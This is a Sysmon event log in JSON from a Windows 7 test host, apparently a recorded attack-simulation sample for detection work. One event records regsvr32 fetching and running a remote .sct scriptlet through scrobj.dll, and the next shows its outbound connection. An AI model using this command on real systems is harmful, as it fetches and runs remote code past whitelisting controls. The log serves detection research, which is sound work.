[
  {
    "Event": {
      "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
      "System": {
        "Provider": {
          "@Name": "Microsoft-Windows-Sysmon",
          "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
        },
        "EventID": {
          "@Qualifiers": "",
          "#text": "1"
        },
        "Version": "5",
        "Level": "4",
        "Task": "1",
        "Opcode": "0",
        "Keywords": "0x8000000000000000",
        "TimeCreated": {
          "@SystemTime": "2019-05-13 18:02:49.160589+00:00"
        },
        "EventRecordID": "17285",
        "Correlation": {
          "@ActivityID": "",
          "@RelatedActivityID": ""
        },
        "Execution": {
          "@ProcessID": "276",
          "@ThreadID": "1000"
        },
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Computer": "IEWIN7",
        "Security": {
          "@UserID": "S-1-5-18"
        }
      },
      "EventData": {
        "Data": [
          {
            "@Name": "RuleName"
          },
          {
            "@Name": "UtcTime",
            "#text": "2019-05-13 18:02:47.527"
          },
          {
            "@Name": "ProcessGuid",
            "#text": "{365abb72-b147-5cd9-0000-00109d4f0b00}"
          },
          {
            "@Name": "ProcessId",
            "#text": "3828"
          },
          {
            "@Name": "Image",
            "#text": "C:\\Windows\\System32\\mobsync.exe"
          },
          {
            "@Name": "FileVersion",
            "#text": "6.1.7601.17514 (win7sp1_rtm.101119-1850)"
          },
          {
            "@Name": "Description",
            "#text": "Microsoft Sync Center"
          },
          {
            "@Name": "Product",
            "#text": "Microsoft\u00ae Windows\u00ae Operating System"
          },
          {
            "@Name": "Company",
            "#text": "Microsoft Corporation"
          },
          {
            "@Name": "CommandLine",
            "#text": "C:\\Windows\\System32\\mobsync.exe -Embedding"
          },
          {
            "@Name": "CurrentDirectory",
            "#text": "C:\\Windows\\system32\\"
          },
          {
            "@Name": "User",
            "#text": "IEWIN7\\IEUser"
          },
          {
            "@Name": "LogonGuid",
            "#text": "{365abb72-b0ec-5cd9-0000-00201d340100}"
          },
          {
            "@Name": "LogonId",
            "#text": "0x000000000001341d"
          },
          {
            "@Name": "TerminalSessionId",
            "#text": "1"
          },
          {
            "@Name": "IntegrityLevel",
            "#text": "Medium"
          },
          {
            "@Name": "Hashes",
            "#text": "SHA1=02A887DF2F485A19A051AF0F3D01DAC006DD9A83,MD5=CCA67BD391CFC9F036323B2522887A6A,SHA256=79F5BC1AD13A5575A52D39A000D0873B31865659B5EFC66A7FEF5E43E54C38B9,IMPHASH=8B7E2EE81565F21F95BADB244F9C56E6"
          },
          {
            "@Name": "ParentProcessGuid",
            "#text": "{365abb72-b0eb-5cd9-0000-00108d760000}"
          },
          {
            "@Name": "ParentProcessId",
            "#text": "596"
          },
          {
            "@Name": "ParentImage",
            "#text": "C:\\Windows\\System32\\svchost.exe"
          },
          {
            "@Name": "ParentCommandLine",
            "#text": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch"
          }
        ]
      }
    }
  },
  {
    "Event": {
      "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
      "System": {
        "Provider": {
          "@Name": "Microsoft-Windows-Sysmon",
          "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
        },
        "EventID": {
          "@Qualifiers": "",
          "#text": "1"
        },
        "Version": "5",
        "Level": "4",
        "Task": "1",
        "Opcode": "0",
        "Keywords": "0x8000000000000000",
        "TimeCreated": {
          "@SystemTime": "2019-05-13 18:03:19.681479+00:00"
        },
        "EventRecordID": "17286",
        "Correlation": {
          "@ActivityID": "",
          "@RelatedActivityID": ""
        },
        "Execution": {
          "@ProcessID": "276",
          "@ThreadID": "1000"
        },
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Computer": "IEWIN7",
        "Security": {
          "@UserID": "S-1-5-18"
        }
      },
      "EventData": {
        "Data": [
          {
            "@Name": "RuleName"
          },
          {
            "@Name": "UtcTime",
            "#text": "2019-05-13 18:03:19.482"
          },
          {
            "@Name": "ProcessGuid",
            "#text": "{365abb72-b167-5cd9-0000-0010ee150c00}"
          },
          {
            "@Name": "ProcessId",
            "#text": "2372"
          },
          {
            "@Name": "Image",
            "#text": "C:\\Windows\\System32\\cmd.exe"
          },
          {
            "@Name": "FileVersion",
            "#text": "6.1.7601.17514 (win7sp1_rtm.101119-1850)"
          },
          {
            "@Name": "Description",
            "#text": "Windows Command Processor"
          },
          {
            "@Name": "Product",
            "#text": "Microsoft\u00ae Windows\u00ae Operating System"
          },
          {
            "@Name": "Company",
            "#text": "Microsoft Corporation"
          },
          {
            "@Name": "CommandLine",
            "#text": "/c notepad.exe"
          },
          {
            "@Name": "CurrentDirectory",
            "#text": "C:\\Windows\\system32\\"
          },
          {
            "@Name": "User",
            "#text": "IEWIN7\\IEUser"
          },
          {
            "@Name": "LogonGuid",
            "#text": "{365abb72-b0ec-5cd9-0000-0020de330100}"
          },
          {
            "@Name": "LogonId",
            "#text": "0x00000000000133de"
          },
          {
            "@Name": "TerminalSessionId",
            "#text": "1"
          },
          {
            "@Name": "IntegrityLevel",
            "#text": "High"
          },
          {
            "@Name": "Hashes",
            "#text": "SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163"
          },
          {
            "@Name": "ParentProcessGuid",
            "#text": "{365abb72-b0ec-5cd9-0000-0010d9d20000}"
          },
          {
            "@Name": "ParentProcessId",
            "#text": "944"
          },
          {
            "@Name": "ParentImage",
            "#text": "C:\\Windows\\System32\\svchost.exe"
          },
          {
            "@Name": "ParentCommandLine",
            "#text": "C:\\Windows\\system32\\svchost.exe -k netsvcs"
          }
        ]
      }
    }
  },
  {
    "Event": {
      "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
      "System": {
        "Provider": {
          "@Name": "Microsoft-Windows-Sysmon",
          "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
        },
        "EventID": {
          "@Qualifiers": "",
          "#text": "1"
        },
        "Version": "5",
        "Level": "4",
        "Task": "1",
        "Opcode": "0",
        "Keywords": "0x8000000000000000",
        "TimeCreated": {
          "@SystemTime": "2019-05-13 18:03:19.681479+00:00"
        },
        "EventRecordID": "17287",
        "Correlation": {
          "@ActivityID": "",
          "@RelatedActivityID": ""
        },
        "Execution": {
          "@ProcessID": "276",
          "@ThreadID": "1000"
        },
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Computer": "IEWIN7",
        "Security": {
          "@UserID": "S-1-5-18"
        }
      },
      "EventData": {
        "Data": [
          {
            "@Name": "RuleName"
          },
          {
            "@Name": "UtcTime",
            "#text": "2019-05-13 18:03:19.497"
          },
          {
            "@Name": "ProcessGuid",
            "#text": "{365abb72-b167-5cd9-0000-001062160c00}"
          },
          {
            "@Name": "ProcessId",
            "#text": "2476"
          },
          {
            "@Name": "Image",
            "#text": "C:\\Windows\\System32\\regsvr32.exe"
          },
          {
            "@Name": "FileVersion",
            "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
          },
          {
            "@Name": "Description",
            "#text": "Microsoft(C) Register Server"
          },
          {
            "@Name": "Product",
            "#text": "Microsoft\u00ae Windows\u00ae Operating System"
          },
          {
            "@Name": "Company",
            "#text": "Microsoft Corporation"
          },
          {
            "@Name": "CommandLine",
            "#text": "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"
          },
          {
            "@Name": "CurrentDirectory",
            "#text": "C:\\Windows\\system32\\"
          },
          {
            "@Name": "User",
            "#text": "IEWIN7\\IEUser"
          },
          {
            "@Name": "LogonGuid",
            "#text": "{365abb72-b0ec-5cd9-0000-00201d340100}"
          },
          {
            "@Name": "LogonId",
            "#text": "0x000000000001341d"
          },
          {
            "@Name": "TerminalSessionId",
            "#text": "1"
          },
          {
            "@Name": "IntegrityLevel",
            "#text": "Medium"
          },
          {
            "@Name": "Hashes",
            "#text": "SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583"
          },
          {
            "@Name": "ParentProcessGuid",
            "#text": "{365abb72-b0ec-5cd9-0000-0010d9d20000}"
          },
          {
            "@Name": "ParentProcessId",
            "#text": "944"
          },
          {
            "@Name": "ParentImage",
            "#text": "C:\\Windows\\System32\\svchost.exe"
          },
          {
            "@Name": "ParentCommandLine",
            "#text": "C:\\Windows\\system32\\svchost.exe -k netsvcs"
          }
        ]
      }
    }
  },
  {
    "Event": {
      "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
      "System": {
        "Provider": {
          "@Name": "Microsoft-Windows-Sysmon",
          "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
        },
        "EventID": {
          "@Qualifiers": "",
          "#text": "1"
        },
        "Version": "5",
        "Level": "4",
        "Task": "1",
        "Opcode": "0",
        "Keywords": "0x8000000000000000",
        "TimeCreated": {
          "@SystemTime": "2019-05-13 18:03:19.895876+00:00"
        },
        "EventRecordID": "17288",
        "Correlation": {
          "@ActivityID": "",
          "@RelatedActivityID": ""
        },
        "Execution": {
          "@ProcessID": "276",
          "@ThreadID": "1000"
        },
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Computer": "IEWIN7",
        "Security": {
          "@UserID": "S-1-5-18"
        }
      },
      "EventData": {
        "Data": [
          {
            "@Name": "RuleName"
          },
          {
            "@Name": "UtcTime",
            "#text": "2019-05-13 18:03:19.727"
          },
          {
            "@Name": "ProcessGuid",
            "#text": "{365abb72-b167-5cd9-0000-00109d240c00}"
          },
          {
            "@Name": "ProcessId",
            "#text": "2584"
          },
          {
            "@Name": "Image",
            "#text": "C:\\Windows\\System32\\notepad.exe"
          },
          {
            "@Name": "FileVersion",
            "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
          },
          {
            "@Name": "Description",
            "#text": "Notepad"
          },
          {
            "@Name": "Product",
            "#text": "Microsoft\u00ae Windows\u00ae Operating System"
          },
          {
            "@Name": "Company",
            "#text": "Microsoft Corporation"
          },
          {
            "@Name": "CommandLine",
            "#text": "notepad.exe"
          },
          {
            "@Name": "CurrentDirectory",
            "#text": "C:\\Windows\\system32\\"
          },
          {
            "@Name": "User",
            "#text": "IEWIN7\\IEUser"
          },
          {
            "@Name": "LogonGuid",
            "#text": "{365abb72-b0ec-5cd9-0000-0020de330100}"
          },
          {
            "@Name": "LogonId",
            "#text": "0x00000000000133de"
          },
          {
            "@Name": "TerminalSessionId",
            "#text": "1"
          },
          {
            "@Name": "IntegrityLevel",
            "#text": "High"
          },
          {
            "@Name": "Hashes",
            "#text": "SHA1=FC64B1EF19E7F35642B2A2EA5F5D9F4246866243,MD5=A4F6DF0E33E644E802C8798ED94D80EA,SHA256=B56AFE7165AD341A749D2D3BD925D879728A1FE4A4DF206145C1A69AA233F68B,IMPHASH=53A6715F589E88C4FD4541C81B4F57C3"
          },
          {
            "@Name": "ParentProcessGuid",
            "#text": "{365abb72-b167-5cd9-0000-0010ee150c00}"
          },
          {
            "@Name": "ParentProcessId",
            "#text": "2372"
          },
          {
            "@Name": "ParentImage",
            "#text": "C:\\Windows\\System32\\cmd.exe"
          },
          {
            "@Name": "ParentCommandLine",
            "#text": "/c notepad.exe"
          }
        ]
      }
    }
  },
  {
    "Event": {
      "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
      "System": {
        "Provider": {
          "@Name": "Microsoft-Windows-Sysmon",
          "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
        },
        "EventID": {
          "@Qualifiers": "",
          "#text": "3"
        },
        "Version": "5",
        "Level": "4",
        "Task": "3",
        "Opcode": "0",
        "Keywords": "0x8000000000000000",
        "TimeCreated": {
          "@SystemTime": "2019-05-13 18:03:21.212896+00:00"
        },
        "EventRecordID": "17289",
        "Correlation": {
          "@ActivityID": "",
          "@RelatedActivityID": ""
        },
        "Execution": {
          "@ProcessID": "276",
          "@ThreadID": "2056"
        },
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Computer": "IEWIN7",
        "Security": {
          "@UserID": "S-1-5-18"
        }
      },
      "EventData": {
        "Data": [
          {
            "@Name": "RuleName"
          },
          {
            "@Name": "UtcTime",
            "#text": "2019-05-13 18:03:20.485"
          },
          {
            "@Name": "ProcessGuid",
            "#text": "{365abb72-b167-5cd9-0000-001062160c00}"
          },
          {
            "@Name": "ProcessId",
            "#text": "2476"
          },
          {
            "@Name": "Image",
            "#text": "C:\\Windows\\System32\\regsvr32.exe"
          },
          {
            "@Name": "User",
            "#text": "IEWIN7\\IEUser"
          },
          {
            "@Name": "Protocol",
            "#text": "tcp"
          },
          {
            "@Name": "Initiated",
            "#text": "True"
          },
          {
            "@Name": "SourceIsIpv6",
            "#text": "False"
          },
          {
            "@Name": "SourceIp",
            "#text": "10.0.2.15"
          },
          {
            "@Name": "SourceHostname",
            "#text": "IEWIN7"
          },
          {
            "@Name": "SourcePort",
            "#text": "49159"
          },
          {
            "@Name": "SourcePortName"
          },
          {
            "@Name": "DestinationIsIpv6",
            "#text": "False"
          },
          {
            "@Name": "DestinationIp",
            "#text": "151.101.128.133"
          },
          {
            "@Name": "DestinationHostname"
          },
          {
            "@Name": "DestinationPort",
            "#text": "443"
          },
          {
            "@Name": "DestinationPortName",
            "#text": "https"
          }
        ]
      }
    }
  },
  {
    "Event": {
      "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
      "System": {
        "Provider": {
          "@Name": "Microsoft-Windows-Sysmon",
          "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
        },
        "EventID": {
          "@Qualifiers": "",
          "#text": "1"
        },
        "Version": "5",
        "Level": "4",
        "Task": "1",
        "Opcode": "0",
        "Keywords": "0x8000000000000000",
        "TimeCreated": {
          "@SystemTime": "2019-05-13 18:05:18.692038+00:00"
        },
        "EventRecordID": "17292",
        "Correlation": {
          "@ActivityID": "",
          "@RelatedActivityID": ""
        },
        "Execution": {
          "@ProcessID": "276",
          "@ThreadID": "1000"
        },
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Computer": "IEWIN7",
        "Security": {
          "@UserID": "S-1-5-18"
        }
      },
      "EventData": {
        "Data": [
          {
            "@Name": "RuleName"
          },
          {
            "@Name": "UtcTime",
            "#text": "2019-05-13 18:05:18.676"
          },
          {
            "@Name": "ProcessGuid",
            "#text": "{365abb72-b1de-5cd9-0000-0010715b0d00}"
          },
          {
            "@Name": "ProcessId",
            "#text": "1188"
          },
          {
            "@Name": "Image",
            "#text": "C:\\Windows\\System32\\wbem\\WMIADAP.exe"
          },
          {
            "@Name": "FileVersion",
            "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
          },
          {
            "@Name": "Description",
            "#text": "WMI Reverse Performance Adapter Maintenance Utility"
          },
          {
            "@Name": "Product",
            "#text": "Microsoft\u00ae Windows\u00ae Operating System"
          },
          {
            "@Name": "Company",
            "#text": "Microsoft Corporation"
          },
          {
            "@Name": "CommandLine",
            "#text": "wmiadap.exe /F /T /R"
          },
          {
            "@Name": "CurrentDirectory",
            "#text": "C:\\Windows\\system32\\"
          },
          {
            "@Name": "User",
            "#text": "NT AUTHORITY\\SYSTEM"
          },
          {
            "@Name": "LogonGuid",
            "#text": "{365abb72-b0eb-5cd9-0000-0020e7030000}"
          },
          {
            "@Name": "LogonId",
            "#text": "0x00000000000003e7"
          },
          {
            "@Name": "TerminalSessionId",
            "#text": "0"
          },
          {
            "@Name": "IntegrityLevel",
            "#text": "System"
          },
          {
            "@Name": "Hashes",
            "#text": "SHA1=DC6DC543EAC398DE6821325BFF3625C1CFC8EC3D,MD5=52799EAD792B0E9AE7FD4BA5BD18FE5C,SHA256=BE4838F4DB23D56CF75730DD36451C5F0F2ACA36B8A74844E7675DC5D5AD0C58,IMPHASH=FAAD498DDAEF07E1AF22EEF06D02AE2C"
          },
          {
            "@Name": "ParentProcessGuid",
            "#text": "{365abb72-b0ec-5cd9-0000-0010d9d20000}"
          },
          {
            "@Name": "ParentProcessId",
            "#text": "944"
          },
          {
            "@Name": "ParentImage",
            "#text": "C:\\Windows\\System32\\svchost.exe"
          },
          {
            "@Name": "ParentCommandLine",
            "#text": "C:\\Windows\\system32\\svchost.exe -k netsvcs"
          }
        ]
      }
    }
  }
]